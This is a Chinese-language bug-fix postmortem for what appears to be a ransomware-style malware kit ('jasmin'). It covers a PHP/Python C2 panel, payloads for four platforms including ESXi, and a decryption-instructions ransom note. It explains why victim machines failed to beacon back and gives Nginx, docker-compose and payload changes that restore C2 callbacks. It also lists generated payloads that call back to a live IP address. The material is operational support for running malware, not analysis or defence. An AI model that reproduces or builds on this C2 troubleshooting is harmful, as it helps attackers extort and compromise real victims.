## 一、根因分析

### 1.1 Nginx 的 `$host` 会剥掉端口（核心）

`docker/nginx/nginx.conf` 原配置：

```nginx
location / {
    proxy_pass http://php_backend;
    proxy_set_header Host $host;      # ← 问题在这
    ...
}
```

Nginx 变量语义：

| 变量 | 含义 | `Host: 34.2.145.178:8080` 时 |
|---|---|---|
| `$host` | request line / Host 头 / server_name，**规范化后不含端口** | `34.2.145.178` |
| `$http_host` | **原始 Host 头，原样保留** | `34.2.145.178:8080` |

于是后端拿到的 Host 永远没有端口：

- PHP：`$_SERVER['HTTP_HOST']` = `34.2.145.178` → C2 = `http://34.2.145.178/handshake.php`
- Flask：`request.url_root` = `http://34.2.145.178/` → C2 = `http://34.2.145.178/handshake`

用户访问的是 `http://34.2.145.178:8080`，但生成的 C2 指向 **80 端口（无任何服务）**。

**实测证据**（`payloads/` 下历史载荷的 C2 值）：

```

jasmin_linux_20261001_011243_d4e42e94.py     http://34.2.145.178/handshake      ← 无端口
jasmin_linux_20261001_015921_bee07f1d.py     http://34.2.145.178/handshake      ← 无端口

```

受害者机器回连这个地址 → 连接被拒 → `beacon()` 吞掉异常 → **后台永远没有数据，且受害者端/操作者端都没有任何提示**。

> 注意格式差异正好印证了来源：`/handshake.php` 是 **PHP 后台**生成的，`/handshake` 是 **Python 后台**生成的 —— 两个后端都受影响。

### 1.2 `beacon()` 静默失败（放大器）

```python

        urllib.request.urlopen(req,timeout=10)
```

四个平台都是这样（ESXi 的 `http_post` 用 `2>/dev/null`，C# 用 `catch{}`）。

## 二、修复内容

### 2.1 Nginx：保留端口 + 增加 80 监听

```nginx
server {
    listen 80;      # 80 端口: 让 http://host/... 这类"不带端口"的 URL 也能用
    listen 8080;
    ...
    location / {
        proxy_pass http://php_backend;
        proxy_set_header Host $http_host;   # ← $host -> $http_host，保留端口
        ...
    }
}
```

`docker-compose.cluster.yml`：

```yaml
    ports:
      - "80:80"       # PHP 后台入口(无端口 URL, 与 8080 等价)
      - "8080:8080"   # PHP 后台入口
      - "5000:5000"   # Python 后台入口
```

**双保险**：
1. `$http_host` 保证通过 `:8080` 访问时生成的 C2 带端口；
2. 80 端口映射让**不带端口**的 URL 也能正常工作 —— 这也**向后兼容**：用户手上已有的旧载荷（C2 写着 `http://34.2.145.178/handshake.php`）**无需重新生成即可回连成功**。

### 2.2 上报失败必须可见（四平台）

**Linux / macOS**

```python
        sys.stderr.write('[jasmin] !!! 原因: %s\n'%e)
        sys.stderr.write('[jasmin] !!! 请检查回连地址是否可达、端口是否正确(本服务在 :8080)、握手密钥是否与后台一致\n')
```

`READ_ME_解密教程.txt` → **`READ_ME_DECRYPT.txt`**，四平台统一。

### 2.4 模板单一数据源（MUST）

在 `Dockerfile.python` 中，用 PHP 侧模板覆盖 Python 侧副本：


## 六、经验

1. **`proxy_set_header Host $host` 是隐性杀手。** 端口非默认时后端拿到的 Host 缺端口，凡是"根据 Host 生成回连地址"的功能都会静默失效。**反向代理一律用 `$http_host`**。
2. **静默 catch 会延长故障时间。** 这次三个问题里有俩都因为"出错不吭声"而难以定位。凡是网络调用，失败必须留痕。
3. **默认端口的坑。** 用户天然会省略 `:8080`。既然功能依赖端口，就让服务同时监听标准端口（80），而不是指望用户记住。
4. **同一份资源存在两个副本 = 迟早漂移。** `Web Panel/templates/` 与 `Web Panel Python/templates/payloads/` 的副本在我 v2.3.4 修复时就漂了一次，且**恰好只修了一边**。正确做法是在构建阶段强制单一数据源，而不是靠"记得同步"。
